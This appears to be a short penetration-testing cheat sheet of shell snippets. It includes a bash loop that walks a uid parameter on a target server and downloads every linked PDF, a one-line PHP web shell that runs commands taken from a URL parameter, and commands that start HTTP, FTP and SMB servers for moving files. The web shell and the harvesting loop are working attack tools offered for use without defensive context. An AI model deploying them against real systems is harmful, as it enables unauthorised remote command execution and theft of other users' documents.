# Create list from 1 to 100
```
for i in {1..100};do echo $i >> list_numbers.txt; done
```

# Loop through documents using for and curl
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

# Refshell PHP
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
# Starting servers
```shell-session
sudo python3 -m http.server <LISTENING_PORT>
```
```shell-session
sudo python -m pyftpdlib -p 21
```
```shell-session
impacket-smbserver -smb2support share $(pwd)
```